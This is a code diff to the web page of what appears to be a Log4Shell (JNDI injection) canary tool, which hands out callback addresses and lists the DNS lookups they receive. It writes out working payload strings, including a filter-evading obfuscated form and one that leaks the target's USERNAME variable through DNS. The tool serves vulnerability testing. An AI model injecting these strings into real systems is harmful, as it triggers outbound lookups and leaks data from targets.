@@ -109,7 +109,7 @@ Get a new address!">
                     <input type="text" v-model="address" class="form-control">
                 </div>
                 <div class="input-group mb-2">
-                    <button class="btn btn-outline-info btn-sm" id="button-vuln1" @click="copyUrl(vuln1)">Copy
+                    <button class="btn btn-outline-info btn-sm" id="button-vuln1" @click="copyUrl(vuln)">Copy
                     </button>
                     <button type="button" class="btn btn-outline-info dropdown-toggle dropdown-toggle-split"
                             data-bs-toggle="dropdown" aria-expanded="false">
@@ -117,7 +117,7 @@ Get a new address!">
                     </button>
                     <ul class="dropdown-menu">
                         <li><a class="dropdown-item" @click="selected=1">:jndi:dns:</a></li>
-                        <li><a class="dropdown-item" @click="selected=2">:jndi:ldap:</a></li>
+<!--                        <li><a class="dropdown-item" @click="selected=2">:jndi:ldap:</a></li>-->
                         <li><a class="dropdown-item" @click="selected=3">Obfuscated :jndi:dns:</a></li>
                         <li><hr class="dropdown-divider"></li>
                         <li><a class="dropdown-item" aria-disabled="true">Select one option above - then press copy</a></li>
@@ -132,7 +132,7 @@ Get a new address!">
                             Used
                         </button>
                     </transition>
-                    <input type="text" v-model="vuln1" class="form-control" aria-describedby="button-vuln1"></input>
+                    <input type="text" v-model="vuln" class="form-control" aria-describedby="button-vuln1"></input>
                 </div>
             </div>
 
@@ -140,6 +140,7 @@ Get a new address!">
         <div class="row">
             <div class="">
                 <h2>Detected name lookups</h2>
+                <span class="visually-hidden">${vuln1}</span>
             </div>
             <div id="output"></div>
             <div id="table">
@@ -186,32 +187,46 @@ Get a new address!">
                 rowData: [],
                 depletedUrl: false,
                 selected: 1,
+                prevselected: 1,
+                vuln: '',
             }
         },
         computed: {
             vuln1: function() {
                 switch (this.selected) {
                     case 1:
-                        console.log("selected is 1")
-                        return "${jndi:dns://" + this.address + "/a}";
+                        this.vuln = "${jndi:dns://" + this.address + "/a}";
+                        this.prevselected = this.selected;
+                        this.selected = 0;
+                        return this.vuln;
+/*
                     case 2:
-                        return "${jndi:ldap://" + this.address + "/a}";
-                        break;
+                        this.vuln = "${jndi:ldap://" + this.address + "/a}";
+                        this.prevselected = this.selected;
+                        this.selected = 0;
+                        return this.vuln;
+*/
                     case 3:
-                        return "${${env:lsweqw:-j}ndi${env:lsweqw:-:}${env:lsweqw:-d}ns${env:lsweqw:-:}//" +
+                        this.vuln = "${${env:lsweqw:-j}ndi${env:lsweqw:-:}${env:lsweqw:-d}ns${env:lsweqw:-:}//" +
                             this.address + "/a}";
+                        this.prevselected = this.selected;
+                        this.selected = 0;
+                        return this.vuln;
                     case 4:
-                        return "${jndi:dns://${env:USERNAME}" + this.address + "/a}";
+                        this.vuln = "${jndi:dns://${env:USERNAME}" + this.address + "/a}";
+                        this.prevselected = this.selected;
+                        this.selected = 0;
+                        return this.vuln;
                     default:
-                        this.vuln = '';
+                        this.selected = 0;
                 }
             }
-
         },
         methods: {
             setAddress(url) {
                 this.address = url;
                 this.depletedUrl = false;
+                this.selected = this.prevselected;
             },
             copyUrl(data) {
                 try {
@@ -269,21 +284,17 @@ Get a new address!">
                     if (!ws) {
                         vm.listenActive = false;
                         clearInterval(intervalCheckId);
-                        // console.log("no - not open for" + vm.address)
                         return false;
                     } else {
                         vm.listenActive = true;
                     }
 
-                    // console.log("Are we active? " + vm.address)
                     if (ws.readyState === 1) {
                         ws.send(vm.address);
                         vm.listenActive = true;
-                        // console.log("Yes")
                     } else {
                         vm.listenActive = false;
                         clearInterval(intervalCheckId)
-                        // console.log("No")
                     }
                 }, 1000);
             }
@@ -292,9 +303,7 @@ Get a new address!">
                 let msg = JSON.parse(evt.data);
                 switch (msg.Type) {
                     case 'newaddress':
-                        // console.log("New address: " + msg.Url);
                         vm.setAddress(msg.Url);
-
                         break;
                     case 'lookup':
                         vm.lookup(msg);
@@ -302,7 +311,6 @@ Get a new address!">
                 }
             }
             ws.onerror = function (evt) {
-                // console.log("Got error - trying to shut down things.")
                 clearInterval(intervalCheckId)
                 vm.listenActive = false;
             }
